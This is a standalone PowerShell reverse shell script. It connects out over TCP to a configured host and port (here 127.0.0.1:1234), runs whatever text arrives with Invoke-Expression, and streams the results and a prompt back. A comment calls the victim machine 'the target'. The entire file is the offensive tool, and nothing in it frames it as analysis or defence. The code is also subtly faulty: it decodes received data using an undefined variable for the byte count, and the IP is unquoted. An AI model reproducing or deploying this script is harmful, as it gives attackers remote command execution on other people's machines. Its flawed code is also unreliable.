try{
    $Port=1234
    $Ip=127.0.0.1

    #Create TCPClient Socket    
    $client = New-Object System.Net.Sockets.TCPClient($Ip,$Port)

    #Get the bit stream from the client server socket connection
    $stream = $client.GetStream()

    #Create a byte array with 65536 elements filled with 0 values
    [byte[]]$bytes = 0..65535|%{0}

    while(($data = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        
        #Create an ASCII Text Object
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)

        try{
            #Execute the command on the target.
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
        }
        catch{
            Write-Error $_
            Write-Warning "Something went wrong!" 

        }
        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        #Return the results
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
}
catch
{
    Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
    Write-Error $_
}